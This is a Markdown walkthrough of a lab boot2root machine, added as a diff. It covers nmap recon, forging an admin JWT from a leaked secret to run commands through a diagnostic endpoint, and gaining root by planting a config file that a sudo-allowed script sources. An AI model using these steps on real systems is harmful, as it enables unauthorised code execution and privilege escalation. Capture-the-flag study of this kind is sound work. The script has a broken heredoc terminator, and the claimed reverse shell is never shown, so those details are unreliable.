@@ -1,0 +1,62 @@
+---
+title: 'Example Lab: Minimal Boot2Root'
+description: 'A concise walk-through of a tiny boot2root box highlighting recon, foothold, and privesc notes.'
+date: 2025-12-16
+tags: ['boot2root', 'notes', 'walkthrough']
+authors: ['0xasta']
+toc: true
+---
+
+## Scope & goals
+
+- Single VM, no external calls required.
+- Objective: read `/root/flag.txt`.
+- Tools: `nmap`, `feroxbuster`, `linpeas`, and a custom Python script for the exploit.
+
+## Recon
+
+1. Quick TCP scan:
+
+```bash
+nmap -Pn -sC -sV 10.10.10.42
+```
+
+Output showed SSH (OpenSSH 9.x) and a lightweight HTTP server on port 8080 with a static site.
+
+2. Content discovery hinted at `/backup/config.yml`, which exposed a hard-coded JWT secret.
+
+## Foothold
+
+The web app accepted a JWT for admin actions. With the leaked secret we forged a token and triggered a diagnostic endpoint to execute a controlled command:
+
+```bash
+python3 - <<'PY'
+import jwt, requests
+url = 'http://10.10.10.42:8080/diagnostics'
+secret = 'revoked-dev-secret'
+token = jwt.encode({'role': 'admin'}, secret, algorithm='HS256')
+print('[+] token', token)
+res = requests.post(url, json={'cmd': 'id'}, headers={'Authorization': f'Bearer {token}'})
+print(res.text)
+PY'
+```
+
+That returned a shell as `www-data` via a simple web-reverse shell payload.
+
+## Privilege escalation
+
+- `sudo -l` showed we could run `/usr/local/bin/backup.sh` as root without a password.
+- The script sourced `/tmp/backup.cfg` if it existed. We created a config that replaced `tar` with our payload.
+
+```bash
+echo 'tar=/bin/bash -p' > /tmp/backup.cfg
+sudo /usr/local/bin/backup.sh
+```
+
+We got a root shell and grabbed the flag.
+
+## Takeaways
+
+- Treat leaked JWT secrets as immediate RCE candidates when diagnostic endpoints exist.
+- Guard sudo-allowed scripts from sourcing writable paths.
+- Keep notes small and repeatable; this template stays readable for future boxes.
